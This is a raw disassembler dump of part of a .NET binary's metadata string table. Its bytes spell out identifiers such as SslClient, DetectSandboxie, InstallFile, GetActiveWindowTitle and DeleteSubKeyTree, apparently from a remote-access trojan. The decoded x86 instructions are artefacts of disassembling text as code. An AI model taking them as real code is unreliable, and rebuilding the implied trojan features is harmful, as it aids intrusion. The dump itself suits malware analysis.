  407c58:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c5b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c5c:	67 46                	addr16 inc %esi
  407c5e:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c65:	75 66                	jne    0x407ccd
  407c67:	66 65 72 3e          	data16 gs jb 0x407ca9
  407c6b:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c6f:	61                   	popa
  407c70:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c73:	6e                   	outsb  %ds:(%esi),(%dx)
  407c74:	67 46                	addr16 inc %esi
  407c76:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c7d:	66 66 73 65          	data16 data16 jae 0x407ce6
  407c81:	74 3e                	je     0x407cc1
  407c83:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c87:	61                   	popa
  407c88:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c8b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c8c:	67 46                	addr16 inc %esi
  407c8e:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c95:	73 6c                	jae    0x407d03
  407c97:	43                   	inc    %ebx
  407c98:	6c                   	insb   (%dx),%es:(%edi)
  407c99:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca0:	5f                   	pop    %edi
  407ca1:	42                   	inc    %edx
  407ca2:	61                   	popa
  407ca3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ca6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca7:	67 46                	addr16 inc %esi
  407ca9:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407cb0:	63 70 43             	arpl   %esi,0x43(%eax)
  407cb3:	6c                   	insb   (%dx),%es:(%edi)
  407cb4:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cbb:	5f                   	pop    %edi
  407cbc:	42                   	inc    %edx
  407cbd:	61                   	popa
  407cbe:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc2:	67 46                	addr16 inc %esi
  407cc4:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407ccb:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccc:	65 72 41             	gs jb  0x407d10
  407ccf:	64 64 4d             	fs fs dec %ebp
  407cd2:	61                   	popa
  407cd3:	70 43                	jo     0x407d18
  407cd5:	68 69 6c 64 00       	push   $0x646c69
  407cda:	49                   	dec    %ecx
  407cdb:	6e                   	outsb  %ds:(%esi),(%dx)
  407cdc:	6e                   	outsb  %ds:(%esi),(%dx)
  407cdd:	65 72 41             	gs jb  0x407d21
  407ce0:	64 64 41             	fs fs inc %ecx
  407ce3:	72 72                	jb     0x407d57
  407ce5:	61                   	popa
  407ce6:	79 43                	jns    0x407d2b
  407ce8:	68 69 6c 64 00       	push   $0x646c69
  407ced:	68 57 6e 64 00       	push   $0x646e57
  407cf2:	53                   	push   %ebx
  407cf3:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cf5:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cf9:	70 65                	jo     0x407d60
  407cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407cfc:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407d00:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407d07:	61 
  407d08:	6c                   	insb   (%dx),%es:(%edi)
  407d09:	75 65                	jne    0x407d70
  407d0b:	4b                   	dec    %ebx
  407d0c:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d13:	6c                   	insb   (%dx),%es:(%edi)
  407d14:	61                   	popa
  407d15:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d18:	43                   	inc    %ebx
  407d19:	72 65                	jb     0x407d80
  407d1b:	61                   	popa
  407d1c:	74 65                	je     0x407d83
  407d1e:	49                   	dec    %ecx
  407d1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407d20:	73 74                	jae    0x407d96
  407d22:	61                   	popa
  407d23:	6e                   	outsb  %ds:(%esi),(%dx)
  407d24:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d27:	73 65                	jae    0x407d8e
  407d29:	74 5f                	je     0x407d8a
  407d2b:	4d                   	dec    %ebp
  407d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2d:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d32:	6c                   	insb   (%dx),%es:(%edi)
  407d33:	65 4d                	gs dec %ebp
  407d35:	6f                   	outsl  %ds:(%esi),(%dx)
  407d36:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d3b:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d42:	64 65 
  407d44:	00 45 6e             	add    %al,0x6e(%ebp)
  407d47:	74 65                	je     0x407dae
  407d49:	72 44                	jb     0x407d8f
  407d4b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d4f:	4d                   	dec    %ebp
  407d50:	6f                   	outsl  %ds:(%esi),(%dx)
  407d51:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d56:	79 70                	jns    0x407dc8
  407d58:	74 6f                	je     0x407dc9
  407d5a:	53                   	push   %ebx
  407d5b:	74 72                	je     0x407dcf
  407d5d:	65 61                	gs popa
  407d5f:	6d                   	insl   (%dx),%es:(%edi)
  407d60:	4d                   	dec    %ebp
  407d61:	6f                   	outsl  %ds:(%esi),(%dx)
  407d62:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d67:	6d                   	insl   (%dx),%es:(%edi)
  407d68:	70 72                	jo     0x407ddc
  407d6a:	65 73 73             	gs jae 0x407de0
  407d6d:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d74:	00 43 69             	add    %al,0x69(%ebx)
  407d77:	70 68                	jo     0x407de1
  407d79:	65 72 4d             	gs jb  0x407dc9
  407d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7d:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d82:	6c                   	insb   (%dx),%es:(%edi)
  407d83:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d88:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d8d:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d91:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d94:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d99:	65 74 65             	gs je  0x407e01
  407d9c:	53                   	push   %ebx
  407d9d:	75 62                	jne    0x407e01
  407d9f:	4b                   	dec    %ebx
  407da0:	65 79 54             	gs jns 0x407df7
  407da3:	72 65                	jb     0x407e0a
  407da5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407da9:	74 5f                	je     0x407e0a
  407dab:	4d                   	dec    %ebp
  407dac:	65 73 73             	gs jae 0x407e22
  407daf:	61                   	popa
  407db0:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407db5:	74 65                	je     0x407e1c
  407db7:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407dbb:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbc:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dc0:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dc7:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dcb:	45                   	inc    %ebp
  407dcc:	6e                   	outsb  %ds:(%esi),(%dx)
  407dcd:	75 6d                	jne    0x407e3c
  407dcf:	65 72 61             	gs jb  0x407e33
  407dd2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dd6:	49                   	dec    %ecx
  407dd7:	44                   	inc    %esp
  407dd8:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407ddf:	6c                   	insb   (%dx),%es:(%edi)
  407de0:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407de5:	6f                   	outsl  %ds:(%esi),(%dx)
  407de6:	75 62                	jne    0x407e4a
  407de8:	6c                   	insb   (%dx),%es:(%edi)
  407de9:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407ded:	61                   	popa
  407dee:	70 44                	jo     0x407e34
  407df0:	6f                   	outsl  %ds:(%esi),(%dx)
  407df1:	75 62                	jne    0x407e55
  407df3:	6c                   	insb   (%dx),%es:(%edi)
  407df4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407df8:	74 5f                	je     0x407e59
  407dfa:	48                   	dec    %eax
  407dfb:	61                   	popa
  407dfc:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfd:	64 6c                	fs insb (%dx),%es:(%edi)
  407dff:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e03:	6e                   	outsb  %ds:(%esi),(%dx)
  407e04:	74 69                	je     0x407e6f
  407e06:	6d                   	insl   (%dx),%es:(%edi)
  407e07:	65 46                	gs inc %esi
  407e09:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e10:	64 6c                	fs insb (%dx),%es:(%edi)
  407e12:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e16:	74 4d                	je     0x407e65
  407e18:	6f                   	outsl  %ds:(%esi),(%dx)
  407e19:	64 75 6c             	fs jne 0x407e88
  407e1c:	65 48                	gs dec %eax
  407e1e:	61                   	popa
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	64 6c                	fs insb (%dx),%es:(%edi)
  407e22:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e26:	6e                   	outsb  %ds:(%esi),(%dx)
  407e27:	74 69                	je     0x407e92
  407e29:	6d                   	insl   (%dx),%es:(%edi)
  407e2a:	65 54                	gs push %esp
  407e2c:	79 70                	jns    0x407e9e
  407e2e:	65 48                	gs dec %eax
  407e30:	61                   	popa
  407e31:	6e                   	outsb  %ds:(%esi),(%dx)
  407e32:	64 6c                	fs insb (%dx),%es:(%edi)
  407e34:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e38:	74 54                	je     0x407e8e
  407e3a:	79 70                	jns    0x407eac
  407e3c:	65 46                	gs inc %esi
  407e3e:	72 6f                	jb     0x407eaf
  407e40:	6d                   	insl   (%dx),%es:(%edi)
  407e41:	48                   	dec    %eax
  407e42:	61                   	popa
  407e43:	6e                   	outsb  %ds:(%esi),(%dx)
  407e44:	64 6c                	fs insb (%dx),%es:(%edi)
  407e46:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e4a:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e51:	65 
  407e52:	00 57 72             	add    %dl,0x72(%edi)
  407e55:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e5c:	6c 
  407e5d:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e62:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e69:	65 74 41             	gs je  0x407ead
  407e6c:	73 53                	jae    0x407ec1
  407e6e:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e75:	6e                   	outsb  %ds:(%esi),(%dx)
  407e76:	73 74                	jae    0x407eec
  407e78:	61                   	popa
  407e79:	6c                   	insb   (%dx),%es:(%edi)
  407e7a:	6c                   	insb   (%dx),%es:(%edi)
  407e7b:	46                   	inc    %esi
  407e7c:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e83:	6f 
  407e84:	64 65 46             	fs gs inc %esi
  407e87:	72 6f                	jb     0x407ef8
  407e89:	6d                   	insl   (%dx),%es:(%edi)
  407e8a:	46                   	inc    %esi
  407e8b:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e92:	65 
  407e93:	42                   	inc    %edx
  407e94:	79 74                	jns    0x407f0a
  407e96:	65 73 54             	gs jae 0x407eed
  407e99:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9a:	46                   	inc    %esi
  407e9b:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407ea2:	6e 
  407ea3:	52                   	push   %edx
  407ea4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea5:	6c                   	insb   (%dx),%es:(%edi)
  407ea6:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407eaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407eab:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ead:	77 73                	ja     0x407f22
  407eaf:	42                   	inc    %edx
  407eb0:	75 69                	jne    0x407f1b
  407eb2:	6c                   	insb   (%dx),%es:(%edi)
  407eb3:	74 49                	je     0x407efe
  407eb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb6:	52                   	push   %edx
  407eb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb8:	6c                   	insb   (%dx),%es:(%edi)
  407eb9:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ebd:	74 41                	je     0x407f00
  407ebf:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407ec3:	65 57                	gs push %edi
  407ec5:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ecc:	74 6c                	je     0x407f3a
  407ece:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ed2:	74 5f                	je     0x407f33
  407ed4:	4d                   	dec    %ebp
  407ed5:	61                   	popa
  407ed6:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407edd:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ee1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee2:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ee5:	73 4d                	jae    0x407f34
  407ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee8:	64 75 6c             	fs jne 0x407f57
  407eeb:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407eef:	74 5f                	je     0x407f50
  407ef1:	57                   	push   %edi
  407ef2:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ef9:	79 6c                	jns    0x407f67
  407efb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407eff:	6f                   	outsl  %ds:(%esi),(%dx)
  407f00:	63 65 73             	arpl   %esp,0x73(%ebp)
  407f03:	73 57                	jae    0x407f5c
  407f05:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f0c:	79 6c                	jns    0x407f7a
  407f0e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f12:	74 5f                	je     0x407f73
  407f14:	4e                   	dec    %esi
  407f15:	61                   	popa
  407f16:	6d                   	insl   (%dx),%es:(%edi)
  407f17:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f1b:	74 5f                	je     0x407f7c
  407f1d:	46                   	inc    %esi
  407f1e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f25:	00 
  407f26:	73 65                	jae    0x407f8d
  407f28:	74 5f                	je     0x407f89
  407f2a:	46                   	inc    %esi
  407f2b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f32:	00 
  407f33:	47                   	inc    %edi
  407f34:	65 74 54             	gs je  0x407f8b
  407f37:	65 6d                	gs insl (%dx),%es:(%edi)
  407f39:	70 46                	jo     0x407f81
  407f3b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f42:	00 
  407f43:	47                   	inc    %edi
  407f44:	65 74 46             	gs je  0x407f8d
  407f47:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f4e:	00 
  407f4f:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f56:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f5b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5c:	64 75 6c             	fs jne 0x407fcb
  407f5f:	65 4e                	gs dec %esi
  407f61:	61                   	popa
  407f62:	6d                   	insl   (%dx),%es:(%edi)
  407f63:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f67:	74 5f                	je     0x407fc8
  407f69:	4d                   	dec    %ebp
  407f6a:	61                   	popa
  407f6b:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6f:	65 4e                	gs dec %esi
  407f71:	61                   	popa
  407f72:	6d                   	insl   (%dx),%es:(%edi)
  407f73:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f77:	74 5f                	je     0x407fd8
  407f79:	4f                   	dec    %edi
  407f7a:	53                   	push   %ebx
  407f7b:	46                   	inc    %esi
  407f7c:	75 6c                	jne    0x407fea
  407f7e:	6c                   	insb   (%dx),%es:(%edi)
  407f7f:	4e                   	dec    %esi
  407f80:	61                   	popa
  407f81:	6d                   	insl   (%dx),%es:(%edi)
  407f82:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f86:	74 5f                	je     0x407fe7
  407f88:	46                   	inc    %esi
  407f89:	75 6c                	jne    0x407ff7
  407f8b:	6c                   	insb   (%dx),%es:(%edi)
  407f8c:	4e                   	dec    %esi
  407f8d:	61                   	popa
  407f8e:	6d                   	insl   (%dx),%es:(%edi)
  407f8f:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f93:	56                   	push   %esi
  407f94:	61                   	popa
  407f95:	6c                   	insb   (%dx),%es:(%edi)
  407f96:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f9d:	6e 
  407f9e:	4e                   	dec    %esi
  407f9f:	61                   	popa
  407fa0:	6d                   	insl   (%dx),%es:(%edi)
  407fa1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407fa5:	74 5f                	je     0x408006
  407fa7:	55                   	push   %ebp
  407fa8:	73 65                	jae    0x40800f
  407faa:	72 4e                	jb     0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fb3:	65 72 4e             	gs jb  0x408004
  407fb6:	61                   	popa
  407fb7:	6d                   	insl   (%dx),%es:(%edi)
  407fb8:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fbc:	74 4e                	je     0x40800c
  407fbe:	61                   	popa
  407fbf:	6d                   	insl   (%dx),%es:(%edi)
  407fc0:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fc4:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc9:	73 74                	jae    0x40803f
  407fcb:	4e                   	dec    %esi
  407fcc:	61                   	popa
  407fcd:	6d                   	insl   (%dx),%es:(%edi)
  407fce:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fd2:	6d                   	insl   (%dx),%es:(%edi)
  407fd3:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fd8:	65 54                	gs push %esp
  407fda:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fe1:	5f                   	pop    %edi
  407fe2:	4c                   	dec    %esp
  407fe3:	61                   	popa
  407fe4:	73 74                	jae    0x40805a
  407fe6:	57                   	push   %edi
  407fe7:	72 69                	jb     0x408052
  407fe9:	74 65                	je     0x408050
  407feb:	54                   	push   %esp
  407fec:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407ff3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff4:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ffb:	54                   	push   %esp
  407ffc:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408003:	74 65                	je     0x40806a
  408005:	4c                   	dec    %esp
  408006:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  40800d:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408010:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408014:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40801b:	6d                   	insl   (%dx),%es:(%edi)
  40801c:	65 54                	gs push %esp
  40801e:	79 70                	jns    0x408090
  408020:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408024:	74 5f                	je     0x408085
  408026:	56                   	push   %esi
  408027:	61                   	popa
  408028:	6c                   	insb   (%dx),%es:(%edi)
  408029:	75 65                	jne    0x408090
  40802b:	54                   	push   %esp
  40802c:	79 70                	jns    0x40809e
  40802e:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408032:	6c                   	insb   (%dx),%es:(%edi)
  408033:	75 65                	jne    0x40809a
  408035:	54                   	push   %esp
  408036:	79 70                	jns    0x4080a8
  408038:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  40803c:	67 50                	addr16 push %eax
  40803e:	61                   	popa
  40803f:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408042:	79 70                	jns    0x4080b4
  408044:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408048:	6f                   	outsl  %ds:(%esi),(%dx)
  408049:	74 6f                	je     0x4080ba
  40804b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40804e:	54                   	push   %esp
  40804f:	79 70                	jns    0x4080c1
  408051:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408055:	74 54                	je     0x4080ab
  408057:	79 70                	jns    0x4080c9
  408059:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40805d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408060:	74 54                	je     0x4080b6
  408062:	79 70                	jns    0x4080d4
  408064:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408068:	6c                   	insb   (%dx),%es:(%edi)
  408069:	65 53                	gs push %ebx
  40806b:	68 61 72 65 00       	push   $0x657261
  408070:	53                   	push   %ebx
  408071:	79 73                	jns    0x4080e6
  408073:	74 65                	je     0x4080da
  408075:	6d                   	insl   (%dx),%es:(%edi)
  408076:	2e 43                	cs inc %ebx
  408078:	6f                   	outsl  %ds:(%esi),(%dx)
  408079:	72 65                	jb     0x4080e0
  40807b:	00 53 65             	add    %dl,0x65(%ebx)
  40807e:	72 76                	jb     0x4080f6
  408080:	65 72 73             	gs jb  0x4080f6
  408083:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  40808a:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  40808e:	6f                   	outsl  %ds:(%esi),(%dx)
  40808f:	73 65                	jae    0x4080f6
  408091:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408095:	70 6f                	jo     0x408106
  408097:	73 65                	jae    0x4080fe
  408099:	00 50 61             	add    %dl,0x61(%eax)
  40809c:	72 73                	jb     0x408111
  40809e:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4080a2:	72 52                	jb     0x4080f6
  4080a4:	65 76 65             	gs jbe 0x40810c
  4080a7:	72 73                	jb     0x40811c
  4080a9:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080ad:	30 39                	xor    %bh,(%ecx)
  4080af:	43                   	inc    %ebx
  4080b0:	65 72 74             	gs jb  0x408127
  4080b3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ba:	00 56 61             	add    %dl,0x61(%esi)
  4080bd:	6c                   	insb   (%dx),%es:(%edi)
  4080be:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080c5:	72 
  4080c6:	76 65                	jbe    0x40812d
  4080c8:	72 43                	jb     0x40810d
  4080ca:	65 72 74             	gs jb  0x408141
  4080cd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d4:	00 63 65             	add    %ah,0x65(%ebx)
  4080d7:	72 74                	jb     0x40814d
  4080d9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080e0:	00 43 72             	add    %al,0x72(%ebx)
  4080e3:	65 61                	gs popa
  4080e5:	74 65                	je     0x40814c
  4080e7:	00 53 65             	add    %dl,0x65(%ebx)
  4080ea:	74 54                	je     0x408140
  4080ec:	68 72 65 61 64       	push   $0x64616572
  4080f1:	45                   	inc    %ebp
  4080f2:	78 65                	js     0x408159
  4080f4:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080f7:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080fe:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408103:	65 74 65             	gs je  0x40816b
  408106:	00 43 61             	add    %al,0x61(%ebx)
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	6c                   	insb   (%dx),%es:(%edi)
  40810b:	53                   	push   %ebx
  40810c:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408113:	74 
  408114:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408118:	6d                   	insl   (%dx),%es:(%edi)
  408119:	70 69                	jo     0x408184
  40811b:	6c                   	insb   (%dx),%es:(%edi)
  40811c:	65 72 47             	gs jb  0x408166
  40811f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408121:	65 72 61             	gs jb  0x408185
  408124:	74 65                	je     0x40818b
  408126:	64 41                	fs inc %ecx
  408128:	74 74                	je     0x40819e
  40812a:	72 69                	jb     0x408195
  40812c:	62 75 74             	bound  %esi,0x74(%ebp)
  40812f:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408134:	75 67                	jne    0x40819d
  408136:	67 61                	addr16 popa
  408138:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40813c:	74 74                	je     0x4081b2
  40813e:	72 69                	jb     0x4081a9
  408140:	62 75 74             	bound  %esi,0x74(%ebp)
  408143:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408147:	6d                   	insl   (%dx),%es:(%edi)
  408148:	56                   	push   %esi
  408149:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408150:	74 74                	je     0x4081c6
  408152:	72 69                	jb     0x4081bd
  408154:	62 75 74             	bound  %esi,0x74(%ebp)
  408157:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40815b:	73 65                	jae    0x4081c2
  40815d:	6d                   	insl   (%dx),%es:(%edi)
  40815e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408162:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408169:	72 
  40816a:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408171:	73 73                	jae    0x4081e6
  408173:	65 6d                	gs insl (%dx),%es:(%edi)
  408175:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408179:	72 61                	jb     0x4081dc
  40817b:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40817e:	61                   	popa
  40817f:	72 6b                	jb     0x4081ec
  408181:	41                   	inc    %ecx
  408182:	74 74                	je     0x4081f8
  408184:	72 69                	jb     0x4081ef
  408186:	62 75 74             	bound  %esi,0x74(%ebp)
  408189:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40818e:	67 65 74 46          	addr16 gs je 0x4081d8
  408192:	72 61                	jb     0x4081f5
  408194:	6d                   	insl   (%dx),%es:(%edi)
  408195:	65 77 6f             	gs ja  0x408207
  408198:	72 6b                	jb     0x408205
  40819a:	41                   	inc    %ecx
  40819b:	74 74                	je     0x408211
  40819d:	72 69                	jb     0x408208
  40819f:	62 75 74             	bound  %esi,0x74(%ebp)
  4081a2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081a6:	73 65                	jae    0x40820d
  4081a8:	6d                   	insl   (%dx),%es:(%edi)
  4081a9:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081ad:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081b4:	69 
  4081b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b7:	41                   	inc    %ecx
  4081b8:	74 74                	je     0x40822e
  4081ba:	72 69                	jb     0x408225
  4081bc:	62 75 74             	bound  %esi,0x74(%ebp)
  4081bf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081c3:	73 65                	jae    0x40822a
  4081c5:	6d                   	insl   (%dx),%es:(%edi)
  4081c6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cb:	6e                   	outsb  %ds:(%esi),(%dx)
